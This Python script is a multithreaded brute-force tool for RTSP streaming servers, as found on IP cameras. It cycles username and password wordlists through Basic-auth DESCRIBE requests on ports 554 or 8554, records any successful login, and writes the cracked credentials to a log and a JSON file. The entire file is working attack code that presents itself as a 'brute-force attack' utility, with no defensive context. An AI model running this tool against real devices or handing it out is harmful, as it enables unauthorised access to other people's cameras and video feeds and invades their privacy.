import socket
import base64
import os
import time
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
import logging
import json

# Global variables
usr = []
psw = []

# Global flags for pause and rate limiting
pause_flag = False
rate_limit = 2  # Example rate limit: 2 requests per second

# Global variable for storing valid credentials
valid_credentials = []


def decode_line(line, encodings=("utf-8", "latin-1")):
    for encoding in encodings:
        try:
            return line.decode(encoding).strip()
        except UnicodeDecodeError:
            pass
    return None


def req_send(ip, port, enc_creds, verbose=False, timeout=None):
    req = f"DESCRIBE rtsp://{ip}:{port} RTSP/1.0\r\nCSeq: 2\r\nAuthorization: Basic {enc_creds}\r\n\r\n"
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(timeout)

    try:
        s.connect((ip, port))
    except socket.error as e:
        if verbose:
            print(f"Error connecting: {e}")
        return None

    s.sendall(req.encode())
    data = s.recv(1024)
    s.close()

    return data.decode()


def brute_force_chunk(usr_chunk, psw, ip, port, results, verbose=False, timeout=None):
    for username in usr_chunk:
        for password in psw:
            cred = f"{username}:{password}"
            cred64 = base64.b64encode(cred.encode()).decode()

            # Check for pause
            while pause_flag:
                time.sleep(1)

            response = req_send(ip, port, cred64, verbose=verbose, timeout=timeout)

            if verbose:
                print(f"Attempt: {username}/{password}, Response: {response}")

            if "200 OK" in response:
                results.append((username, password))
                logging.info(
                    f"Successful login - Username: {username}, Password: {password}"
                )
                return True  # Break out of the loop if successful

    return False


def print_calculations(iteration_results, total_requests):
    while True:
        time.sleep(1)
        if iteration_results:
            i, j, rpm, etr, cp = iteration_results[-1]
            print(
                f"Iteration {i} - Requests per minute: {rpm:.2f}, Estimated time until completion: {etr:.2f} minutes, Completion: {cp:.2f}%",
                end="",
                flush=True,
            )


def setup_logger(log_file="brute_force.log"):
    logging.basicConfig(
        filename=log_file,
        level=logging.INFO,
        format="%(asctime)s - %(levelname)s - %(message)s",
    )


def save_results_to_file(results, output_file="results.json"):
    with open(output_file, "w") as file:
        json.dump(results, file, indent=4)


def interactive_config():
    global usr, psw

    print("Interactive Configuration:")
    ip = input("Enter IP: ")
    port_choice = input("Choose port 554(1) or 8554(2): ")

    if port_choice == "1":
        port = 554
    elif port_choice == "2":
        port = 8554
    else:
        port = 554
    print(f"Port set to {port}")

    user_file_str = input("Enter Usernames List Location: ")
    pass_file_str = input("Enter Password List Location: ")

    verbose_input = input("Enable verbose output? (y/n): ")
    verbose = verbose_input.lower() == "y"

    timeout_input = input("Set socket timeout in seconds (press Enter for default): ")
    timeout = float(timeout_input) if timeout_input else None

    if not (os.path.isfile(user_file_str) and os.path.isfile(pass_file_str)):
        print("Error: Invalid file location(s). Please check your file paths.")
        return

    usr = []
    psw = []

    with open(user_file_str, "rb") as f:
        usr = [decode_line(line) for line in f]

    with open(pass_file_str, "rb") as f:
        psw = [decode_line(line) for line in f]

    usr = [line for line in usr if line is not None]
    psw = [line for line in psw if line is not None]

    return ip, port, usr, psw, verbose, timeout


def brute_force(
    ip, port, usr, psw, num_threads=4, chunk_size=100, verbose=False, timeout=None
):
    total_requests = len(usr) * len(psw)
    start_time = time.time()
    huhu = False
    iteration_results = []

    print_thread = threading.Thread(
        target=print_calculations, args=(iteration_results, total_requests), daemon=True
    )
    print_thread.start()

    usr_chunks = [usr[i : i + chunk_size] for i in range(0, len(usr), chunk_size)]

    with ThreadPoolExecutor(max_workers=num_threads) as executor:
        futures = []

        for i, usr_chunk in enumerate(usr_chunks):
            future = executor.submit(
                brute_force_chunk,
                usr_chunk,
                psw,
                ip,
                port,
                valid_credentials,
                verbose,
                timeout,
            )
            futures.append(future)

        for i, future in enumerate(as_completed(futures)):
            try:
                future.result()  # Wait for each thread to finish
            except Exception as e:
                logging.error(f"Thread {i + 1} failed with error: {e}")

            elapsed_time = time.time() - start_time
            requests_per_minute = (i + 1) * len(psw) / elapsed_time * 60
            completion_percentage = (i + 1) * len(psw) / total_requests * 100
            estimated_time_remaining = (
                total_requests - (i + 1) * len(psw)
            ) / requests_per_minute

            iteration_results.append(
                (
                    i + 1,
                    len(psw),
                    requests_per_minute,
                    estimated_time_remaining,
                    completion_percentage,
                )
            )

            # Check for pause during calculations
            while pause_flag:
                time.sleep(1)

    if not valid_credentials:
        print("\nLogin attempt unsuccessful. No valid credentials found.")
        logging.info("Login attempt unsuccessful. No valid credentials found.")

    # Print calculations and summary at the bottom
    print("\nCalculations:")
    for i, j, rpm, etr, cp in iteration_results:
        print(
            f"Iteration {i} - Requests per minute: {rpm:.2f}, Estimated time until completion: {etr:.2f} minutes, Completion: {cp:.2f}%"
        )
        logging.info(
            f"Iteration {i} - Requests per minute: {rpm:.2f}, Estimated time until completion: {etr:.2f} minutes, Completion: {cp:.2f}%"
        )

    print("\nSummary:")
    print(f"Total valid credentials found: {len(valid_credentials)}")
    logging.info(f"Total valid credentials found: {len(valid_credentials)}")

    for username, password in valid_credentials:
        print(f"Username: {username}, Password: {password}")
        logging.info(f"Username: {username}, Password: {password}")

    save_results_to_file(valid_credentials)


def pause_resume():
    global pause_flag
    while True:
        input("Press Enter to pause/resume...")
        pause_flag = not pause_flag
        if pause_flag:
            print(
                "\nBrute-force attack paused. Statistics: "
                f"Verified credentials: {len(valid_credentials)}, Completion: {len(valid_credentials) / (len(usr) * len(psw)) * 100:.2f}%"
            )
            logging.info("Brute-force attack paused.")
        else:
            print("Brute-force attack resumed.")
            logging.info("Brute-force attack resumed.")


def help_menu():
    print("\nHelp Menu:")
    print("1. To pause/resume the brute-force attack, press Enter during execution.")
    print("2. You can configure the brute-force attack parameters interactively.")
    print("3. Results are logged in 'brute_force.log' and saved in 'results.json'.")
    print("4. Rate limiting is set to 2 requests per second (configurable).")


if __name__ == "__main__":
    ip, port, usr, psw, verbose, timeout = interactive_config()

    # Start a separate thread for pause/resume functionality
    pause_resume_thread = threading.Thread(target=pause_resume, daemon=True)
    pause_resume_thread.start()

    brute_force_thread = threading.Thread(
        target=brute_force, args=(ip, port, usr, psw, 4, 100, verbose, timeout)
    )
    brute_force_thread.start()
    brute_force_thread.join()  # Wait for the brute-force thread to finish

    # Display help menu after completion
    help_menu()
